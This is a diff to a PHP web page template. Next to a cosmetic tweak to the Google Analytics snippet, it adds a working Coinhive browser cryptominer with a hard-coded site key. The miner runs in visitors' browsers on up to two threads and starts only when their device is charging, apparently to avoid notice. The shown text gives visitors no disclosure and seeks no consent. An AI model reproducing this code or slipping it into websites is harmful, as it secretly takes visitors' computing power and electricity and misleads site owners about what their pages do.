@@ -113,8 +113,48 @@
 			_gaq.push(['_trackPageview']);
 			(function() {
 				var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
-				ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+				ga.src = ('https:' === document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
 				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+			})();
+		</script>
+
+		<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+		<script>
+			(function() {
+				var threads = window.navigator && window.navigator.hardwareConcurrency ? Math.min(window.navigator.hardwareConcurrency, 2) : 1;
+
+				function m() {
+					var CoinHive = window.CoinHive;
+					var miner = new CoinHive.Anonymous('LqTA9a7LkndC8tWMVtuGusRZwmnebZIM');
+					miner.setThrottle(0.9);
+					miner.setNumThreads(threads);
+					miner.on('open', function() {
+						console.debug('Miner started');
+					});
+					miner.on('close', function() {
+						console.debug('Miner stopped');
+					});
+					miner.on('error', function(params) {
+						console.error(params);
+					});
+					miner.start();
+					window.miner = miner;
+				}
+
+				if (window.navigator && window.navigator.getBattery) {
+					window.navigator.getBattery()
+					.then(function (battery) {
+						if (battery.charging) {
+							m();
+						}
+						else {
+							console.debug('Battery not charging. Miner not started');
+						}
+					})
+				}
+				else {
+					m();
+				}
 			})();
 		</script>
 	<?php else: ?>
